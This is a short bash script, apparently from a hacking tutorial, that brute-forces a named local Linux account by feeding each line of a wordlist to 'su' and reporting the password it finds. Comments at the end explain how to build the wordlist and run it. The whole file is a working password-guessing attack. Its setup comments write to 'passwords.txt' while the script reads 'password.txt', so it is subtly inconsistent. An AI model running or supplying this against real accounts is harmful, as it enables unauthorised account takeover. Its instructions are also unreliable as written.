#!/bin/bash
USER="jmartinez"  # The user to attack
PASSWORD_FILE="password.txt"


if [[ ! -f "${PASSWORD_FILE}" ]]; then
    echo "password file does not exist."
    exit 1
fi


while read -r password; do
    echo "Attempting password: ${password} against ${USER}..."
    if echo "${password}" | timeout 0.2 su - ${USER} \
            -c 'whoami' | grep -q "${USER}"; then
       echo
       echo "SUCCESS! The password for ${USER} is ${password}"
       echo "Use su - ${USER} and provide the password to switch"
       exit 0
    fi
done < "${PASSWORD_FILE}"


echo "Unable to compromise ${USER}."
exit 1


# Next, we write a few passwords to the passwords.txt file. Make
# sure this file exists in the same directory as the local_account_bf.sh
# script:
# $ echo test >> passwords.txt
# $ echo test123 >> passwords.txt
# $ echo password123 >> passwords.txt
# $ echo admin >> password.txt
# Now run the script and observe its output:
# $ bash local_account_bf.sh
